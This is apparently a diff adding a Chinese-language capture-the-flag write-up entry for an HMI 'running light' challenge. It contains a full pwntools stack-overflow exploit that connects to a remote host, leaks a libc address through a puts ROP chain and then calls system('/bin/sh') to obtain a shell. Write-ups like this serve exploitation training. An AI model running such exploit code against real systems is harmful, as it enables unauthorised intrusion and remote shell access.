@@ -2534,3 +2534,47 @@ if __name__ == '__main__':
     io.sendlineafter('>> ', '3')
     io.interactive()
 ```
+
+### 27. HMI流水灯运行
+题目：小D在一套HMI人机接口的流水灯中，发现它的接口存在一定的问题，需要我们去查找它的漏洞。
+
+思路：简单的栈溢出。
+
+这里主要存在一个问题就是什么时候发送payload，程序在等待输入前会额外发送一个换行符，因此只要接收到两个换行符就可以输入了。另外一个坑就是程序会不停止输出，直接cat flag，输出结果会被冲掉，可以使用cat flag & cat flag多输出一行。
+
+全部利用代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+debug = False
+if debug:
+    io = process('./format')
+else:
+    io = remote('220.249.52.134', 50761)
+
+elf = ELF('format')
+libc = ELF('libc_32.so.6')
+
+system_addr = libc.sym['system']
+binsh_addr = next(libc.search(b'/bin/sh\x00'))
+
+if __name__ == '__main__':
+    # ROP
+    payload = b'A' * 0x8c
+    payload += p32(elf.plt['puts']) + p32(elf.sym['gee']) + p32(elf.got['puts'])
+    io.sendlineafter('\n\n', payload)
+    data = io.recv(4)
+    print(data)
+    puts_addr = u32(data)
+    libc_addr = puts_addr - libc.sym['puts']
+    log.success('libc addr: 0x%x' % libc_addr)
+
+    system_addr = libc_addr + libc.sym['system']
+    binsh_addr = libc_addr + next(libc.search(b'/bin/sh\x00'))
+
+    payload = b'A' * 0x8c
+    payload += p32(system_addr) + b'A' * 4 + p32(binsh_addr)
+    io.sendline(payload)
+    io.interactive()
+```
